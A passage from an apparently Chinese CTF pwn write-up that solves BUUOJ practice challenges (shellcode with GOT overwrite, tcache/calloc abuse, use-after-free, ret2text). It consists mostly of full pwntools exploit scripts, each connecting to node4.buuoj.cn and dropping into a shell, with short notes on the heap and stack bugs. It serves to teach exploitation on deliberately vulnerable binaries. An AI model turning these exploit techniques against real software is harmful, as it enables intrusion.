punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以下是生成的 shellcode：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'pwn200'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26425</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'\\0'</span> <span class=\"token keyword\">in</span> payload</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'u?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>s1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'~~?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>s2 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'money~\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121171651525.png\" alt=\"image-20231121171651525\"></p>\n<h1 id=\"gyctf_2020_signin\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_signin\">#</a> *gyctf_2020_signin</h1>\n<p>经典堆题。</p>\n<p>释放函数只会释放 flag 为 1 的，同时释放后 flag 置 0，但不清空地址。编辑函数不检验 flag，因此可以构造 tcache dup，实现任意地址读写。</p>\n<p>编辑函数有使用次数限制，cnt 的默认值为 0，因此编辑函数只能使用一次。</p>\n<p><img data-src=\"./image-20231121192939127.png\" alt=\"image-20231121192939127\"></p>\n<p><strong>重点！</strong> <code>calloc</code>  函数不会从 tcache 中获取 chunk，而会从 fastbin 中直接获取。执行后若 tcache bin 中 chunk 个数未满 7，则会将 fastbin 中的 chunk 直接添加到 tcache bin 链<strong>开头</strong>。<strong>不会验证 chunk 合法性</strong>。</p>\n<h2 id=\"思路-2\"><a class=\"markdownIt-Anchor\" href=\"#思路-2\">#</a> 思路</h2>\n<p>先将 tcache bin 填满，然后释放一个 chunk 到 fastbin 中，修改其内容为 <code>ptr-0x10</code> 。之后分配掉几个 tcache bin 的块。</p>\n<p>此时进入后门函数调用 calloc ()，那么会分配到 fastbin 中的 chunk，然后将 ptr-0x10 处的 chunk 添加到 tcache bin 头部，将其 fd 修改为旧的 tcache bin 头部。因此 <code>ptr-0x10+0x10</code>  的值便不为 0，可以通过后门函数的验证。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_signin'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29224</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x4015CD'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x4040C0</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    mal<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"bjdctf_2020_ydsneedgrirlfriend\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_ydsneedgrirlfriend\">#</a> bjdctf_2020_YDSneedGrirlfriend</h1>\n<p>** 考点：**uaf, heap</p>\n<p>保护：没有 pie 和 got 保护。</p>\n<p><img data-src=\"./image-20231121201533808.png\" alt=\"image-20231121201533808\"></p>\n<p>经典 note 块管理 content 块的题。将 note 块的前 8 字节修改为后门函数即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'bjdctf_2020_YDSneedGrirlfriend'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28657</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size is :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name is :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0400B9C</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'666'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'555'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"suctf_2018_stack\"><a class=\"markdownIt-Anchor\" href=\"#suctf_2018_stack\">#</a> suctf_2018_stack</h1>\n<p>** 考点：**ret2libc, 基础</p>\n<p>很基础的题，记得选后门地址时跳过一个 <code>push rbp</code>  以对齐栈帧。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./SUCTF_2018_stack')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27735</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x40067a</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token 